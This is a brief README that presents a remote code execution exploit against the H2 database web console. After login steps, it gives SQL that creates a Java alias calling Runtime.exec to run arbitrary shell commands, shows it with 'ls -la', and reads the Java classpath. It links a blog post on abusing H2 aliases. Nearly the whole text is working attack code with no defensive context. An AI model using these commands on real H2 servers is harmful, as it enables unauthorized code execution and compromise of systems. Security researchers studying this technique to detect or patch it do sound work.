# H2 remote code execution exploit example

- Go to H2 console;
- Login
- Enter following commands:

      CREATE ALIAS GET_SYSTEM_PROPERTY FOR "java.lang.System.getProperty";

      CALL GET_SYSTEM_PROPERTY('java.class.path');

      CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
            
      CALL SHELLEXEC('ls -la')

Additional info here: 

    https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html